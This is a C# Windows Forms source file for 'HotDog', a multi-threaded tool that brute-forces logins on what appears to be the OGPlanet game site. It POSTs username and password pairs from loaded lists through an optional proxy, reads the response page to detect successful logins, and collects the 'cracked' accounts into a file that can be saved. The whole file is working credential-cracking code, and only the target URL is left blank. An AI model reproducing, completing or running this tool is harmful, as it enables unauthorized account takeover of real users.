/*
 * Changes:
 * - Added multi-threading
 * - Switched to thread-safe control member access through invoked delegates
 * - Switched to thread-safe integer access through Interlocked class
 * - Fixed bug with some label text
 * - Added proper thread abort handling
 * - Added handling for when the window handle is destroyed
 * - Added cleanup for Source variable to reduce memory footprint
 * - Added status bar with progress bar
 * - Added extra exception handling
 * - Added time remaining
 * - Added about page
 * - Added proxy support (in beta, I can't really test it)
 * - Added manual garbage collection to massively decrease memory usage on long cracking runs
 * - Fixed crash resulting from attempts made to abort threads before the application started
 * - Fixed crash when trying to do a second cracking run
 * 
 * */

/* DEFINE EITHER APP_RELEASE OR APP_DEBUG, NOT NEITHER OR BOTH */

//#define APP_DEBUG
#define APP_RELEASE

#if (!APP_DEBUG && !APP_RELEASE) || (APP_DEBUG && APP_RELEASE)
Remember to define either DEBUG or RELEASE, and not both
#endif

using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Threading;
using System.Reflection;
using System.Net;
using System.IO;
using System.Diagnostics;
using System.Runtime.Hosting;
using System.Runtime.InteropServices;

namespace HotDog
{
    public partial class frmMain : Form
    {
        // Remember to increment build per release
        private const string AppVersion = "1.25";

        private List<Thread> ThreadList = new List<Thread> ();

        private int wrongPassCount = 0;
        private int invalidUserCount = 0;
        private int tottries = 0;
        private int threads = 8;
        private int activeThreads = 0;
        private int timeElapsed = 0;
        private bool handleOK = true;
        private WebProxy AppProxy = null;
       
        public frmMain()
        {
            InitializeComponent();
        }

        public void Form1_HandleDestroyed(object sender, EventArgs e)
        {
            // This stops invokes from throwing exceptions
            handleOK = false;
            for (int i = 0; i < ThreadList.Count; i++)
            {
                // Kill all threads to clean up properly
                ThreadList[i].Abort();
            }
        }

        private void btnClearUsers_Click(object sender, EventArgs e)
        {
            lstUsernames.Items.Clear();
        }

        //Start Button
        private void btnStart_Click(object sender, EventArgs e)
        {
            // Check proxy first
            AppProxy = null;
            if(rbProxySystem.Checked) {
                // Default proxy settings are loaded automatically since .NET 3.0
                AppProxy = WebProxy.GetDefaultProxy();
            } else if(rbProxyManual.Checked) {
                try
                {
                    AppProxy = new WebProxy(txtProxyAddress.Text, (int)udProxyPort.Value);
                }
                catch (Exception)
                {
                    MessageBox.Show("Invalid proxy settings. Please check address and try again.");
                    return;
                }
            }

            // Clear out the thread list
            ThreadList.Clear();

            // Reset values
            wrongPassCount = 0;
            invalidUserCount = 0;
            tottries = 0;
            activeThreads = 0;
            timeElapsed = 0;

            // Clear logs, but leave the cracked account results!
            lstLog.Items.Clear();

            // Initialize threads but make sure that the number of threads doesn't exceed the number of usernames
            threads = (int)udThreads.Value;
            if (lstUsernames.Items.Count < threads)
            {
                threads = lstUsernames.Items.Count;
            }

            // Start threads
            for (int n = 0; n < threads; n++)
            {
                Thread t = new Thread(new ParameterizedThreadStart(this.crackStart));
                ThreadParam tp = new ThreadParam();
                tp.modVal = threads;
                tp.offset = n;
                ThreadList.Add(t);
                Interlocked.Increment(ref activeThreads);
                ThreadList[n].Start(tp);
            }

            tssStatus.Text = "Cracking...";
            tmrComplete.Enabled = true;

            tabControl1.SelectedIndex = 1;

            btnStart.Enabled = false;
 
        }//End the start button

        private void btnAddUser_Click(object sender, EventArgs e)
        {
            if (txtUsername.Text.Length > 0)
            {
                lstUsernames.Items.Add(txtUsername.Text);
                lblUserCount.Text = lstUsernames.Items.Count.ToString();
                txtUsername.Clear();
            }
        }

        private void btnAddPass_Click(object sender, EventArgs e)
        {
            lstPasswords.Items.Add(txtPassword.Text);
            txtPassword.Clear();
        }

        // Delegates for cross-thread operations
        private delegate void App_SSIDelegate(ListBox lb, int value);
        private delegate void App_AddDelegate(ListBox lb, string value);
        private delegate void App_TextDelegate(Label lb, string value);
        private delegate void App_ProgressDelegate(ToolStripProgressBar pb, int value);
       
        private void SetSelectedIndex(ListBox lb, int value)
        {
            lb.SelectedIndex = value;
        }

        private void ListBoxAdd(ListBox lb, string value)
        {
            lb.Items.Add(value);
        }

        private void LabelSet(Label lc, string value)
        {
            lc.Text = value;
        }

        private void ProgressSet(ToolStripProgressBar pb, int value)
        {
            pb.Value = value;
        }

        // We can only give a thread one object, so if we make it a struct we can pass more info
        private struct ThreadParam
        {
            public int modVal;
            public int offset;
        }

        public void crackStart(object param)
        {
            try
            {
                // Cast the parameters
                ThreadParam tp = (ThreadParam)param;

                if (lstUsernames.Items.Count > 0 && lstPasswords.Items.Count > 0)
                {
                    for (int i = tp.offset; i < lstUsernames.Items.Count; i += tp.modVal)
                    {
                        for (int j = 0; j < lstPasswords.Items.Count; j++)
                        {

                            // Thinking about making the URL and contain process either:
                            // 1) Obselete through header checks, or
                            // 2) Dynamic through some form of definition file
                            string URL = "";

                            /*
                            // TESTING EXCEPTION HANDLER:
                            int x = 0;
                            int y = 1;
                            int z = y / x; // Die like a motherfucker
                             * */

                            Interlocked.Increment(ref tottries);

                            String v = "Trying username: " + lstUsernames.Items[i].ToString() + " with password: " + lstPasswords.Items[j].ToString();

                            // I'm using invokes to write to objects out of this thread's context.
                            // Invokes should always check handleOK to make sure that the form's handle hasn't been destroyed.
                            if (handleOK) this.Invoke(new App_AddDelegate(ListBoxAdd), lstLog, v);

                            if (handleOK) this.Invoke(new App_TextDelegate(LabelSet), lblTotalTries, tottries.ToString());

                            // Read operations are pretty much always thread safe
                            int percent = (int)(((float)tottries / (lstUsernames.Items.Count * lstPasswords.Items.Count) * 100));

                            if (handleOK) this.Invoke(new App_ProgressDelegate(ProgressSet), tssProgress, percent);

                            BruteCracker.PostSubmitter post = new BruteCracker.PostSubmitter();
                            post.Url = URL;
                            post.PostItems.Add("ioBB", "0");
                            post.PostItems.Add("check", "1");
                            post.PostItems.Add("id", lstUsernames.Items[i].ToString());
                            post.PostItems.Add("pw", lstPasswords.Items[j].ToString());
                            post.Type = BruteCracker.PostSubmitter.PostTypeEnum.Post;
                            
                            // Check for proxy
                            if(AppProxy != null) {
                                try
                                {
                                    post.webproxy = AppProxy;
                                }
                                catch (Exception)
                                {
                                    MessageBox.Show("Bad proxy.");
                                    return;
                                }
                            }

                            string Source = null;

                            // Try 3 times to access the resource.
                            bool completedOK = false;
                            for (int t = 0; t < 3; t++)
                            {
                                try
                                {
                                    Source = post.Post();
                                    completedOK = true;
                                    break;
                                }
                                catch (Exception)
                                {
                                }
                            }
                            if (!completedOK)
                            {
                                this.Invoke(new App_AddDelegate(ListBoxAdd), lstLog, "A network error occured. Continuing...");
                                continue;
                            }

                            if (Source.Contains("OGPlanet Login Page") || Source.Contains("Dear"))
                            {
                              
                                this.Invoke(new App_AddDelegate(ListBoxAdd), lstCracked, lstUsernames.Items[i].ToString() + ":" + lstPasswords.Items[j].ToString());
                                if (lstUsernames.Items.Count > i + 1)
                                {
                                    i++;
                                    j = 0;
                                }
                                else
                                {
                                    Interlocked.Decrement(ref activeThreads);
                                    Thread.CurrentThread.Abort();
                                }
                            }
                            else if (Source.Contains("wrong"))
                            {
                                Interlocked.Increment(ref wrongPassCount);

                                if (handleOK) this.Invoke(new App_TextDelegate(LabelSet), lblWrongPasswords, wrongPassCount.ToString());
                            }
                            else if (Source.Contains("not exist"))
                            {
                                Interlocked.Increment(ref invalidUserCount);

                                if (handleOK) this.Invoke(new App_TextDelegate(LabelSet), lblInvalidUsers, invalidUserCount.ToString());
                            }


                            // Important to clean up!
                            Source = null;
                            // Get the garbage collector to call early every so often.
                            // This actually HALVES memory usage on a long cracking run!
                            if(timeElapsed % 5 == 0)
                                GC.Collect();
                        }
                    }
                }
                else
                {
                    MessageBox.Show("One of your listbox's is empty!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                }

                Interlocked.Decrement(ref activeThreads);

            }
            catch (ThreadAbortException)
            {
                // In case of thread abort
            }
#if APP_RELEASE
            catch (Exception ex)
            {
                DateTime now = DateTime.Now;
                String fn = "crashlog-" + now.Year.ToString().PadLeft(4, '0') + "-" + now.Month.ToString().PadLeft(2, '0') + "-" + now.Day.ToString().PadLeft(2, '0') + "-" + now.Hour.ToString().PadLeft(2, '0') + "-" + now.Minute.ToString().PadLeft(2, '0') + "-" + now.Second.ToString().PadLeft(2, '0') + "-" + now.Millisecond.ToString().PadLeft(3, '0') + ".txt";
                String ct = now.ToString() + "\r\n" + ex.Message + "\r\nStack Trace:\r\n" + ex.StackTrace + "\r\n\r\nSource: " + ex.Source + "\r\nMethod: " + ex.TargetSite + "\r\nVersion: " + AppVersion + "\r\n";
                File.WriteAllText(Application.StartupPath + "\\" + fn, ct);
                MessageBox.Show("An error occured: " + ex.Message + "\n\nThis details of this error are stored in " + fn, "Fatal Exception", MessageBoxButtons.OK, MessageBoxIcon.Error  );
                Application.Exit();
            }
#endif
        }//End crackStart


        //load usernames
        private void btnLoad_Click(object sender, EventArgs e)
        {
            OpenFileDialog Open = new OpenFileDialog();
            Open.Filter = "Text Document|*.txt|All Files|*.*";
            try
            {
                Open.ShowDialog();
                StreamReader Import = new StreamReader(Convert.ToString(Open.FileName));

                while (Import.Peek() >= 0)
                    lstUsernames.Items.Add(Convert.ToString(Import.ReadLine()));
            }

            catch (Exception ex)
            {
                MessageBox.Show(Convert.ToString(ex.Message));
                return;
            }
            lblUserCount.Text += lstUsernames.Items.Count.ToString();
        }//load usernames


        //save cracked accounts
        private void btnSaveCracked_Click(object sender, EventArgs e)
        {
            StreamWriter Write;
            SaveFileDialog Open = new SaveFileDialog();
            try
            {
                Open.Filter = ("Text Document|*.txt|All Files|*.*");
                Open.ShowDialog();
                Write = new StreamWriter(Open.FileName);
                for (int i = 0; i < lstPasswords.Items.Count; i++)
                {
                    Write.WriteLine(Convert.ToString(lstLog.Items[i]));
                }
                Write.Close();
            }
            catch (Exception ex)
            {
                MessageBox.Show(Convert.ToString(ex.Message));
                return;
            }
        }//save cracked usernames

        private void btnClearPasswords_Click(object sender, EventArgs e)
        {
            lstPasswords.Items.Clear();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
#if APP_DEBUG
            this.Text += " DEBUG";
#endif
        }

        private void tmrComplete_Tick(object sender, EventArgs e)
        {
            timeElapsed++;
            tssStatus.Text = "Cracking... " + TimeSpan.FromSeconds((int)(((float)timeElapsed / tssProgress.Value)*(100 - tssProgress.Value ))) + " remain";
            int perMin = (int)((float)tottries / ((float)timeElapsed / 60));
            lblTriesPerMinute.Text = perMin.ToString();
            if (activeThreads == 0)
            {
                tmrComplete.Enabled = false;
                tssStatus.Text = "Done";
                btnStart.Enabled = true;
            }
        }

        private void rbProxyManual_CheckedChanged(object sender, EventArgs e)
        {
            txtProxyAddress.Enabled = rbProxyManual.Checked;
            udProxyPort.Enabled = rbProxyManual.Checked;
        }

        private void lstPasswords_DoubleClick(object sender, EventArgs e)
        {
            if (lstPasswords.SelectedIndex >= 0)
            {
                lstPasswords.Items.RemoveAt(lstPasswords.SelectedIndex);
            }
        }

        private void lstUsernames_DoubleClick(object sender, EventArgs e)
        {
            if (lstUsernames.SelectedIndex >= 0)
            {
                lstUsernames.Items.RemoveAt(lstUsernames.SelectedIndex);
                lblUserCount.Text = lstUsernames.Items.Count.ToString();
            }
        }

    }//End the design form
}//End the program
